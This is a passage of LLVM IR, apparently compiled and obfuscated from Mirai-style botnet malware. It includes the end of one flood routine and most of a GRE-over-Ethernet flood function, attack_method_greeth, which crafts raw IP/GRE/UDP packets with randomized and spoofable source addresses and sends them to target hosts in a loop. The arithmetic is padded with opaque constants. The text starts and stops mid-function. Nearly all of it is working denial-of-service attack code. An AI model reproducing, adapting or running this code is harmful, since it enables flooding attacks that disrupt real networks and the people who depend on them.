  store i32 %474, i32* %476, align 4
  br label %483

; <label>:477:                                    ; preds = %470
  %478 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  %480 = load i32, i32* %479, align 4
  %481 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 9
  store i32 %480, i32* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %477, %473
  %484 = load i8, i8* %19, align 1
  %485 = icmp ne i8 %484, 0
  br i1 %485, label %486, label %489

; <label>:486:                                    ; preds = %483
  %487 = load i8*, i8** %31, align 8
  %488 = load i32, i32* %18, align 4
  call void @rand_str(i8* %487, i32 %488)
  br label %489

; <label>:489:                                    ; preds = %486, %483
  %490 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 7
  store i16 0, i16* %491, align 2
  %492 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %493 = bitcast %struct.iphdr* %492 to i16*
  %494 = call zeroext i16 @checksum_generic(i16* %493, i32 20)
  %495 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 7
  store i16 %494, i16* %496, align 2
  %497 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 0, i16* %498, align 2
  %499 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %500 = bitcast %struct.iphdr* %499 to i16*
  %501 = call zeroext i16 @checksum_generic(i16* %500, i32 20)
  %502 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 7
  store i16 %501, i16* %503, align 2
  %504 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %505 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %504, i32 0, i32 3
  store i16 0, i16* %505, align 2
  %506 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %507 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %508 = bitcast %struct.udphdr* %507 to i8*
  %509 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %510 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %509, i32 0, i32 2
  %511 = load i16, i16* %510, align 2
  %512 = load i32, i32* %18, align 4
  %513 = sext i32 %512 to i64
  %514 = add i64 8, -854210881759243057
  %515 = add i64 %514, %513
  %516 = sub i64 %515, -854210881759243057
  %517 = add i64 8, %513
  %518 = trunc i64 %516 to i32
  %519 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %506, i8* %508, i16 zeroext %511, i32 %518)
  %520 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %521 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %520, i32 0, i32 3
  store i16 %519, i16* %521, align 2
  %522 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %523 = load i32, i32* %9, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %522, i64 %524
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %525, i32 0, i32 0
  %527 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %526, i32 0, i32 0
  store i16 2, i16* %527, align 4
  %528 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 9
  %530 = load i32, i32* %529, align 4
  %531 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %532 = load i32, i32* %9, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %531, i64 %533
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i32 0, i32 0
  %536 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %535, i32 0, i32 2
  %537 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %536, i32 0, i32 0
  store i32 %530, i32* %537, align 4
  %538 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %539 = load i32, i32* %9, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i64 %540
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %541, i32 0, i32 0
  %543 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %542, i32 0, i32 1
  store i16 0, i16* %543, align 2
  %544 = load i32, i32* %10, align 4
  %545 = load i8*, i8** %26, align 8
  %546 = load i32, i32* %18, align 4
  %547 = sext i32 %546 to i64
  %548 = sub i64 52, 6248385836898915113
  %549 = add i64 %548, %547
  %550 = add i64 %549, 6248385836898915113
  %551 = add i64 52, %547
  %552 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %553 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %554 = load i32, i32* %9, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %553, i64 %555
  %557 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %556, i32 0, i32 0
  %558 = bitcast %struct.sockaddr_in* %557 to %struct.sockaddr*
  store %struct.sockaddr* %558, %struct.sockaddr** %552, align 8
  %559 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %560 = load %struct.sockaddr*, %struct.sockaddr** %559, align 8
  %561 = call i64 @sendto(i32 %544, i8* %545, i64 %550, i32 16384, %struct.sockaddr* %560, i32 16)
  br label %562

; <label>:562:                                    ; preds = %489
  %563 = load i32, i32* %9, align 4
  %564 = sub i32 0, 1
  %565 = sub i32 %563, %564
  %566 = add nsw i32 %563, 1
  store i32 %565, i32* %9, align 4
  br label %342

; <label>:567:                                    ; preds = %342
  br label %341

; <label>:568:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %577

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %577

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %317, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %323

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = xor i8 %130, -1
  %133 = xor i8 64, -1
  %134 = xor i8 87, -1
  %135 = and i8 %132, 87
  %136 = and i8 %130, %134
  %137 = and i8 %133, 87
  %138 = and i8 64, %134
  %139 = or i8 %135, %136
  %140 = or i8 %137, %138
  %141 = xor i8 %139, %140
  %142 = or i8 %132, %133
  %143 = xor i8 %142, -1
  %144 = or i8 87, %134
  %145 = and i8 %143, %144
  %146 = or i8 %141, %145
  %147 = or i8 %130, 64
  store i8 %146, i8* %126, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 %150, -1
  %152 = xor i8 -16, -1
  %153 = xor i8 -6, -1
  %154 = or i8 %151, %152
  %155 = or i8 -6, %153
  %156 = xor i8 %154, -1
  %157 = and i8 %156, %155
  %158 = and i8 %150, -16
  %159 = and i8 %157, 5
  %160 = xor i8 %157, 5
  %161 = or i8 %159, %160
  %162 = or i8 %157, 5
  store i8 %161, i8* %149, align 4
  %163 = load i8, i8* %12, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 1
  store i8 %163, i8* %165, align 1
  %166 = load i32, i32* %18, align 4
  %167 = sext i32 %166 to i64
  %168 = sub i64 0, %167
  %169 = sub i64 66, %168
  %170 = add i64 66, %167
  %171 = trunc i64 %169 to i16
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %13, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %15, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %101
  %185 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 4
  store i16 %185, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %184, %101
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 47, i8* %190, align 1
  %191 = load i32, i32* %21, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %203 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %204 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %203, i32 0, i32 1
  store i16 %202, i16* %204, align 2
  %205 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %206 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %207 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %206, i32 0, i32 2
  store i16 %205, i16* %207, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %209 = bitcast %struct.iphdr* %208 to i8*
  %210 = load i8, i8* %209, align 4
  %211 = xor i8 15, -1
  %212 = xor i8 %210, %211
  %213 = and i8 %212, %210
  %214 = and i8 %210, 15
  %215 = and i8 %213, 64
  %216 = xor i8 %213, 64
  %217 = or i8 %215, %216
  %218 = or i8 %213, 64
  store i8 %217, i8* %209, align 4
  %219 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %220 = bitcast %struct.iphdr* %219 to i8*
  %221 = load i8, i8* %220, align 4
  %222 = xor i8 -16, -1
  %223 = xor i8 %221, %222
  %224 = and i8 %223, %221
  %225 = and i8 %221, -16
  %226 = and i8 %224, 5
  %227 = xor i8 %224, 5
  %228 = or i8 %226, %227
  %229 = or i8 %224, 5
  store i8 %228, i8* %220, align 4
  %230 = load i8, i8* %12, align 1
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 1
  store i8 %230, i8* %232, align 1
  %233 = load i32, i32* %18, align 4
  %234 = sext i32 %233 to i64
  %235 = add i64 28, 1577732557602302792
  %236 = add i64 %235, %234
  %237 = sub i64 %236, 1577732557602302792
  %238 = add i64 28, %234
  %239 = trunc i64 %237 to i16
  %240 = call zeroext i16 @htons(i16 zeroext %239) #7
  %241 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 2
  store i16 %240, i16* %242, align 2
  %243 = load i16, i16* %13, align 2
  %244 = zext i16 %243 to i32
  %245 = xor i32 %244, -1
  %246 = and i32 690576813, %245
  %247 = xor i32 690576813, -1
  %248 = and i32 %244, %247
  %249 = xor i32 -1, -1
  %250 = and i32 %249, 690576813
  %251 = and i32 -1, %247
  %252 = or i32 %246, %248
  %253 = or i32 %250, %251
  %254 = xor i32 %252, %253
  %255 = xor i32 %244, -1
  %256 = trunc i32 %254 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 4
  %260 = load i8, i8* %14, align 1
  %261 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 5
  store i8 %260, i8* %262, align 4
  %263 = load i8, i8* %15, align 1
  %264 = icmp ne i8 %263, 0
  br i1 %264, label %265, label %269

; <label>:265:                                    ; preds = %188
  %266 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %267 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 4
  store i16 %266, i16* %268, align 2
  br label %269

; <label>:269:                                    ; preds = %265, %188
  %270 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 6
  store i8 17, i8* %271, align 1
  %272 = call i32 @rand_next()
  %273 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 8
  store i32 %272, i32* %274, align 4
  %275 = load i8, i8* %20, align 1
  %276 = icmp ne i8 %275, 0
  br i1 %276, label %277, label %283

; <label>:277:                                    ; preds = %269
  %278 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 9
  %280 = load i32, i32* %279, align 4
  %281 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 9
  store i32 %280, i32* %282, align 4
  br label %298

; <label>:283:                                    ; preds = %269
  %284 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  %286 = load i32, i32* %285, align 4
  %287 = sub i32 0, 1024
  %288 = add i32 %286, %287
  %289 = sub i32 %286, 1024
  %290 = xor i32 %288, -1
  %291 = and i32 -1, %290
  %292 = xor i32 -1, -1
  %293 = and i32 %288, %292
  %294 = or i32 %291, %293
  %295 = xor i32 %288, -1
  %296 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 9
  store i32 %294, i32* %297, align 4
  br label %298

; <label>:298:                                    ; preds = %283, %277
  %299 = load i16, i16* %16, align 2
  %300 = call zeroext i16 @htons(i16 zeroext %299) #7
  %301 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %302 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %301, i32 0, i32 0
  store i16 %300, i16* %302, align 2
  %303 = load i16, i16* %17, align 2
  %304 = call zeroext i16 @htons(i16 zeroext %303) #7
  %305 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %306 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %305, i32 0, i32 1
  store i16 %304, i16* %306, align 2
  %307 = load i32, i32* %18, align 4
  %308 = sext i32 %307 to i64
  %309 = sub i64 8, -166859327307130178
  %310 = add i64 %309, %308
  %311 = add i64 %310, -166859327307130178
  %312 = add i64 8, %308
  %313 = trunc i64 %311 to i16
  %314 = call zeroext i16 @htons(i16 zeroext %313) #7
  %315 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 2
  store i16 %314, i16* %316, align 2
  br label %317

; <label>:317:                                    ; preds = %298
  %318 = load i32, i32* %9, align 4
  %319 = add i32 %318, -1379792839
  %320 = add i32 %319, 1
  %321 = sub i32 %320, -1379792839
  %322 = add nsw i32 %318, 1
  store i32 %321, i32* %9, align 4
  br label %96

; <label>:323:                                    ; preds = %96
  br label %324

; <label>:324:                                    ; preds = %576, %323
  store i32 0, i32* %9, align 4
  br label %325

; <label>:325:                                    ; preds = %571, %324
  %326 = load i32, i32* %9, align 4
  %327 = load i8, i8* %5, align 1
  %328 = zext i8 %327 to i32
  %329 = icmp slt i32 %326, %328
  br i1 %329, label %330, label %576

; <label>:330:                                    ; preds = %325
  %331 = load i8**, i8*** %11, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds i8*, i8** %331, i64 %333
  %335 = load i8*, i8** %334, align 8
  store i8* %335, i8** %30, align 8
  %336 = load i8*, i8** %30, align 8
  %337 = bitcast i8* %336 to %struct.iphdr*
  store %struct.iphdr* %337, %struct.iphdr** %31, align 8
  %338 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i64 1
  %340 = bitcast %struct.iphdr* %339 to %struct.grehdr*
  store %struct.grehdr* %340, %struct.grehdr** %32, align 8
  %341 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %342 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %341, i64 1
  %343 = bitcast %struct.grehdr* %342 to %struct.ethhdr*
  store %struct.ethhdr* %343, %struct.ethhdr** %33, align 8
  %344 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %345 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %344, i64 1
  %346 = bitcast %struct.ethhdr* %345 to %struct.iphdr*
  store %struct.iphdr* %346, %struct.iphdr** %34, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i64 1
  %349 = bitcast %struct.iphdr* %348 to %struct.udphdr*
  store %struct.udphdr* %349, %struct.udphdr** %35, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i64 1
  %352 = bitcast %struct.udphdr* %351 to i8*
  store i8* %352, i8** %36, align 8
  %353 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i32 0, i32 2
  %358 = load i8, i8* %357, align 4
  %359 = zext i8 %358 to i32
  %360 = icmp slt i32 %359, 32
  br i1 %360, label %361, label %385

; <label>:361:                                    ; preds = %330
  %362 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %363 = load i32, i32* %9, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 1
  %367 = load i32, i32* %366, align 4
  %368 = call i32 @ntohl(i32 %367) #7
  %369 = call i32 @rand_next()
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = lshr i32 %369, %376
  %378 = sub i32 %368, -1993343838
  %379 = add i32 %378, %377
  %380 = add i32 %379, -1993343838
  %381 = add i32 %368, %377
  %382 = call i32 @htonl(i32 %380) #7
  %383 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 9
  store i32 %382, i32* %384, align 4
  br label %385

; <label>:385:                                    ; preds = %361, %330
  %386 = load i32, i32* %21, align 4
  %387 = icmp eq i32 %386, -1
  br i1 %387, label %388, label %392

; <label>:388:                                    ; preds = %385
  %389 = call i32 @rand_next()
  %390 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i32 0, i32 8
  store i32 %389, i32* %391, align 4
  br label %392

; <label>:392:                                    ; preds = %388, %385
  %393 = load i16, i16* %13, align 2
  %394 = zext i16 %393 to i32
  %395 = icmp eq i32 %394, 65535
  br i1 %395, label %396, label %431

; <label>:396:                                    ; preds = %392
  %397 = call i32 @rand_next()
  %398 = xor i32 %397, -1
  %399 = xor i32 65535, -1
  %400 = xor i32 -646035204, -1
  %401 = or i32 %398, %399
  %402 = or i32 -646035204, %400
  %403 = xor i32 %401, -1
  %404 = and i32 %403, %402
  %405 = and i32 %397, 65535
  %406 = trunc i32 %404 to i16
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 3
  %411 = load i16, i16* %410, align 4
  %412 = zext i16 %411 to i32
  %413 = sub i32 %412, 1332102490
  %414 = sub i32 %413, 1000
  %415 = add i32 %414, 1332102490
  %416 = sub nsw i32 %412, 1000
  %417 = xor i32 %415, -1
  %418 = and i32 -2147406436, %417
  %419 = xor i32 -2147406436, -1
  %420 = and i32 %415, %419
  %421 = xor i32 -1, -1
